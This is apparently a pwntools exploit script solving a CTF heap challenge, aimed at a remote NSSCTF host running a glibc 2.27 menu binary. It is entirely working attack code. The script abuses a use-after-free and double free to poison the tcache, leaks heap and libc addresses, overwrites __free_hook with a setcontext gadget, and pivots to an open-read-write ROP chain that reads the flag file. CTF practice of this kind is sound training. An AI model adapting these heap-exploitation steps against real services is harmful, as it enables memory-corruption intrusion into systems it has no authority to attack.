from pwn import *
context(arch = 'amd64', os = 'linux')
#context.log_level = 'debug'

#io = process("./pwn")
io = remote('node4.anna.nssctf.cn', 28512)
elf = ELF("./pwn")
libc = elf.libc
libc = ELF("./libc-2.27.so")
local = False

def debug():
	gdb.attach(io)
	pause()

sd   = lambda s    : io.send(s)
sda  = lambda s, n : io.sendafter(s, n)
sl   = lambda s    : io.sendline(s)
sla  = lambda s, n : io.sendlineafter(s, n)
rc   = lambda n    : io.recv(n)
rut  = lambda s    : io.recvuntil(s, drop=True)
ruf  = lambda s    : io.recvuntil(s, drop=False)
addr = lambda s    : u64(io.recvuntil(s, drop=True).ljust(8, b'\x00'))
byte = lambda n    : str(n).encode()
sh   = lambda      : io.interactive()


menu = b'Your choice: '
def add(size):
	sla(menu, b'1')
	sla(b'Index: ', b'0')
	sla(b'Size: ', byte(size))

def edit(content):
	sla(menu, b'2')
	sla(b'Index: ', b'0')
	sla(b'Content: ', content)

def show():
	sla(menu, b'3')
	sla(b'Index: ', b'0')

def dele():
	sla(menu, b'4')
	sla(b'Index: ', b'0')

add(0x30)
dele()
edit(b'\x00'*0x10)
dele()
show()
rut(b'Content: ')
heap_base = addr(b'\n') - 0x1920
print("heap_base   : ", hex(heap_base))

edit(p64(heap_base+0x10))
add(0x30)
add(0x30)
payload = p64(0)*4 + b'\x00\x00\x00\xff'
edit(payload)
dele()
show()
rut(b'Content: ')
unsorted_bin = addr(b'\n')
libc.address = unsorted_bin - 96 - 0x10 - libc.symbols['__malloc_hook']
free_hook = libc.symbols['__free_hook']
setcontext = libc.symbols['setcontext']
print("libc_base   : ", hex(libc.address))
print("free_hook   : ", hex(free_hook))
print("setcontext  : ", hex(setcontext))

read = libc.symbols['read']
write = libc.symbols['write']
if local:
	ret     = 0x00000000000008aa + libc.address # ret
	pop_rdi = 0x000000000002164f + libc.address # pop rdi ; ret
	pop_rsi = 0x0000000000023a6a + libc.address # pop rsi ; ret
	pop_rdx = 0x0000000000001b96 + libc.address # pop rdx ; ret
	pop_rax = 0x000000000001b500 + libc.address # pop rax ; ret
else:
	ret     = 0x00000000000008aa + libc.address # ret
	pop_rdi = 0x00000000000215bf + libc.address # pop rdi ; ret
	pop_rsi = 0x0000000000023eea + libc.address # pop rsi ; ret
	pop_rdx = 0x0000000000001b96 + libc.address # pop rdx ; ret
	pop_rax = 0x0000000000043ae8 + libc.address # pop rax ; ret
	
syscall_ret = read + 0xf # or => write + 0xf

print("read        : ", hex(read))
print("write       : ", hex(write))
print("ret         : ", hex(ret))
print("pop_rdi     : ", hex(pop_rdi))
print("pop_rsi     : ", hex(pop_rsi))
print("pop_rdx     : ", hex(pop_rdx))
print("pop_rax     : ", hex(pop_rax))
print("syscall_ret : ", hex(syscall_ret))

orw_addr = heap_base + 0x1000
flag_addr = heap_base + 0x2000
# open("flag", 0)
orw  = p64(pop_rdi) + p64(flag_addr) 
orw += p64(pop_rsi) + p64(0) 
orw += p64(pop_rax) + p64(2) + p64(syscall_ret)
# read(fd, flag_addr, 0x40)
orw += p64(pop_rdi) + p64(3)
orw += p64(pop_rsi) + p64(flag_addr)
orw += p64(pop_rdx) + p64(0x40) + p64(read)
# write(1, flag_addr, 0x40)
orw += p64(pop_rdi) + p64(1)
orw += p64(pop_rsi) + p64(flag_addr)
orw += p64(pop_rdx) + p64(0x40) + p64(write)
print("orw_addr  : ", hex(orw_addr))
print("flag_addr : ", hex(flag_addr))
print("orw len : ", hex(len(orw)))

add(0x48)
payload = b'\x00\x00\x01\x00\x00\x00\x00\x00' + p64(0)*8
edit(payload)

payload  = p64(free_hook)       # 0x20 -> 0x10
payload += p64(flag_addr)       # 0x30 -> 0x20
payload += p64(flag_addr+0xA0)  # 0x40 -> 0x30
payload += p64(flag_addr)       # 0x50 -> 0x40
payload += p64(orw_addr+0x60)   # 0x60 -> 0x50
payload += p64(orw_addr)	# 0x70 -> 0x60

for i in range(5):
	add(0x10)
add(0x10)
edit(p64(heap_base+0x50))
add(0x38)
edit(payload)

add(0x10)
edit(p64(setcontext+53))

add(0x20)
edit(b'./flag\x00')

add(0x30)
payload = p64(orw_addr) + p64(ret)
edit(payload)

add(0x60)
edit(orw[:0x60])
add(0x50)
edit(orw[0x60:])
add(0x40)
#debug()
dele()
#debug()
sh()
